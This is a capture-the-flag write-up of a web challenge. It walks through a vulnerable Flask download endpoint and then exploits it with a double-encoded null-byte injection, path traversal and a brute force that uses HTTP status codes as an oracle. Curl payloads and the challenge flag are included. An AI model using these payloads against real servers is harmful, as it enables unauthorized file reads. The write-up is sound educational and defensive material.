# just-download-it — VuwCTF 2026 (Web)

> **Challenge:** just-download-it
> **Category:** Web
> **Description:** *Just Download it!*
> **Author:** Arcieeee
> **Flag format:** `VuwCTF{...}`
> **Instance:** `https://just-download-it-<id>.challenges.2026.vuwctf.com/`

---

## TL;DR

The site is a PNG "image uploader" with a download endpoint that is protected
by a **key**. The key is simply the **first 5 bytes of the target file**,
hex-encoded. Two bugs make it fully bypassable:

1. A **null-byte injection** (`%25 00` → decoded → `\x00`) is applied *after*
   the `.png` extension check, letting us drop the `.png` suffix and point the
   server at *any* path.
2. Because the server builds the path with `os.path.join` (un-normalised), a
   **path traversal** (`../`) reaches files outside the upload folder — the
   key check itself acts as a **file-existence + content oracle**.

Walking through the site:

- `/files` lists `illegal.jpg`, `Shark.png`, `fractal.png`. Only `.png` files
  can be downloaded directly, so `illegal.jpg` needs the keyed route.
- Using the null-byte trick we download `illegal.jpg` — a real JPEG whose
  (almost unreadable) text reads:

  > *"The Flag is stored in /app/flag. For Security, the flag's characters are
  > stored in 8 distinct files labelled Flag1.txt - Flag8.txt. Each file
  > contains only 1 character - the respective character in the flag. Don't
  > forget to add VuwCTF{} when submitting!"*

- The flag is split across `/app/flag/Flag1.txt` … `Flag8.txt`, one byte each.
  We traverse to them and **brute-force the single-byte key** (0x00–0xFF) using
  the `403` (wrong key) vs `404`/`200` (correct key) oracle.

Recovered characters (keys → bytes):

| file | key | char |
|------|-----|------|
| Flag1.txt | `21` | `!` |
| Flag2.txt | `4C` | `L` |
| Flag3.txt | `33` | `3` |
| Flag4.txt | `41` | `A` |
| Flag5.txt | `4B` | `K` |
| Flag6.txt | `2A` | `*` |
| Flag7.txt | `44` | `D` |
| Flag8.txt | `21` | `!` |

**Flag: `VuwCTF{!L3AK*D!}`**

---

## Step 1 — Source Analysis

The provided `app.py` is a small Flask app:

```python
import os
from flask import *
from werkzeug.utils import secure_filename
from urllib.parse import unquote

UPLOAD_FOLDER = "shared_files/"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SHARED_FOLDER = os.path.join(BASE_DIR, "shared_files")

app = Flask(__name__)

@app.post("/upload")
def upload():
    file = request.files["image"]
    filename = secure_filename(file.filename)
    if not filename.endswith('.png'):
        return "Invalid" + filename, 404
    file.save(UPLOAD_FOLDER + filename)
    ...

@app.route('/files')
def list_files():
    target_file = request.args.get('file')
    key = request.args.get('key')

    if target_file:
        #Check for valid png file request
        if not target_file.lower().endswith('.png'):
            abort(403, ...)
        if '\x00' in target_file:
            abort(403, ...)

        #Process file path
        target_file = unquote(target_file)
        target_file = target_file.split(chr(0))[0]
        file_path = os.path.join(SHARED_FOLDER, target_file)

        #Compute authentication value
        try:
            with open(file_path, 'rb') as f:
                secret_value = f.read(5).hex(' ').upper()
        except FileNotFoundError:
            abort(404)

        #Check for valid key authentication
        if not key == secret_value:
            abort(403, ...)

        return send_from_directory(directory=SHARED_FOLDER,
                                   path=target_file, as_attachment=True)
    ...
```

Three things stand out:

1. **The check order is broken.** The extension check (`endswith('.png')`) and
   the null-byte check (`'\x00' in target_file`) run on the **raw** query value,
   but `unquote()` is called *afterwards*. Werkzeug already decodes the query
   string once, so sending `%25 00` (i.e. `%00` percent-encoded twice) yields a
   literal `%00` *after* the checks pass. Then `unquote()` turns it into a real
   null byte, and `split(chr(0))[0]` discards everything from the null byte on.

2. **The `.png` check is on the suffix we control.** `../../flag/Flag1.txt` +
   `%00` + `.png` → the *pre-unquote* string ends in `.png`, so the check
   passes, while the *actual* path used is `../../flag/Flag1.txt`.

3. **The key is the file's own first 5 bytes.** That's both a feature (the
   author thought this "authenticates" the request) and the whole vulnerability:
   the key is fully determined by the file, so it leaks the file's contents.

> Note: `send_from_directory` normally prevents path traversal with
> `safe_join`, and `../` in `target_file` makes the final `send_from_directory`
> raise `404`. But the key check — the `open()` + `f.read(5)` — happens
> *before* that, and it already answers our questions: **403** = the file was
> opened and the key was wrong; **404** = the file does not exist (or the
> correct key was supplied and the download step rejected the `..`). That gives
> us a precise oracle.

---

## Step 2 — Recon of the Running Instance

```console
$ curl -s https://just-download-it-<id>.challenges.2026.vuwctf.com/files
```

```html
<h1>📁 Hosted Files Directory</h1>
<ul>
  <li><a href="/files/illegal.jpg">illegal.jpg</a></li>
  <li><a href="/files/Shark.png">Shark.png</a></li>
  <li><a href="/files/fractal.png">fractal.png</a></li>
</ul>
```

`/files/<path:filename>` (the `host_file` route) only serves `.png`, so
`illegal.jpg` is the odd one out and clearly the intended download target.

---

## Step 3 — Downloading `illegal.jpg` via Null-Byte Injection

The URL-encoding trick, in detail. We send:

```
/files?file=illegal.jpg%2500.png&key=FF D8 FF E0 00
```

What happens server-side:

| stage | value |
|-------|-------|
| raw query string | `illegal.jpg%2500.png` |
| Werkzeug decodes once | `illegal.jpg%00.png` |
| `.endswith('.png')` ? | ✅ (still ends in `.png`) |
| contains `'\x00'` ? | ❌ no literal NUL |
| `unquote(...)` | `illegal.jpg\x00.png` |
| `.split('\x00')[0]` | `illegal.jpg` |
| `os.path.join(SHARED_FOLDER, ...)` | `<app>/shared_files/illegal.jpg` |

The key is the first 5 bytes hex-encoded with a space separator, uppercase.
`illegal.jpg` is a real JPEG starting with `\xff\xd8\xff\xe0\x00`, so the key is
`FF D8 FF E0 00`:

```console
$ curl -s -o illegal.jpg "https://just-download-it-<id>.challenges.2026.vuwctf.com/files?file=illegal.jpg%2500.png&key=FF%20D8%20FF%20E0%2000"
$ file illegal.jpg
illegal.jpg: JPEG image data, JFIF standard 1.01, ... 1323x52, components 3
```

A 1323×52 **text banner**. There is no appended payload and no plaintext
`VuwCTF` string — the message is rendered in the pixels:

```
The Flag is stored in /app/flag. For Security, the flag's characters are stored
in 8 distinct files labelled Flag1.txt - Flag8.txt. Each file contains only 1
character - the respective character in the flag. Don't forget to add VuwCTF{}
when submitting!
```

(OCR fails on it at native size because it is tiny and anti-aliased; reading it
by hand is intended.)

---

## Step 4 — The Flag is Split Across 8 One-Byte Files

Hint recap: the flag characters live at `/app/flag/Flag1.txt` … `Flag8.txt`,
one character per file. If the Flask app is in `/app`, then `SHARED_FOLDER` is
`/app/shared_files`, so `/app/flag/Flag1.txt` is reached with a **single** `..`:

```
/app/shared_files/../flag/Flag1.txt   ->   /app/flag/Flag1.txt
```

So the null-byte path becomes:

```
/files?file=../flag/Flag1.txt%2500.png&key=XX
```

### Using the 403 / 404 oracle to prove existence

Each flag file is exactly 1 byte, so `f.read(5).hex(' ')` produces a **single**
two-hex-digit string. If we send a wrong key we get `403`; if the file does not
exist we get `404`. Mapping the layout:

```
control illegal.jpg (wrong key)  -> 403   # file exists, key wrong
control nonexistent.png          -> 404   # no such file
../flag/Flag1.txt (wrong key)    -> 403   # exists! correct depth is ONE ..
../../flag/Flag1.txt             -> 404   # too deep
```

### Brute-forcing the single byte

For each `FlagN.txt` we try all 256 keys `00`…`FF`. Exactly one key is not
`403` (it returns `404` because `send_from_directory` then rejects the `..`,
or `200` if it would serve it) — that key is the byte stored in the file:

```
Flag1.txt [('21', 404)]      # 0x21 = '!'
Flag2.txt [('4C', 404)]      # 0x4C = 'L'
Flag3.txt [('33', 404)]      # 0x33 = '3'
Flag4.txt [('41', 404)]      # 0x41 = 'A'
Flag5.txt [('4B', 404)]      # 0x4B = 'K'
Flag6.txt [('2A', 404)]      # 0x2A = '*'
Flag7.txt [('44', 404)]      # 0x44 = 'D'
Flag8.txt [('21', 404)]      # 0x21 = '!'
```

Concatenating the decoded bytes in order:

```
!  L  3  A  K  *  D  !
```

The challenge name ("Just Download it!") and the content make the theme
obvious — the inner text is a stylised **"LEAKED"** (`!L3AK*D!`). Wrapped in the
flag format:

**Flag: `VuwCTF{!L3AK*D!}`**

---

## Key Takeaways

- **Validate after decoding, not before.** The extension and NUL checks ran on
  the raw value while the *usable* value was produced later by `unquote()`.
  Double-encoding (`%25 00`) slipped a NUL past both checks and the `.png`
  requirement at the same time.
- **Path handling must be canonicalised once.** `os.path.join` on attacker
  input plus a later `send_from_directory` with an un-normalised path is a
  classic traversal. Even when the final serving step is safe, the *key
  computation* (`open(file_path)`) leaks file contents beforehand.
- **Deriving a "secret" from the file you want to keep secret is meaningless.**
  The download key was just the file's first 5 bytes — it both *is* the secret
  and *reveals* it (PNG/JPEG magic headers make it worse: for images it is
  known in advance).
- **HTTP status codes are an oracle.** A carefully chosen server that returns
  `403` for "wrong key" and `404` for "missing file" lets you enumerate files
  and even brute-force one-byte secrets one hex digit at a time.

---

**Flag: `VuwCTF{!L3AK*D!}`**
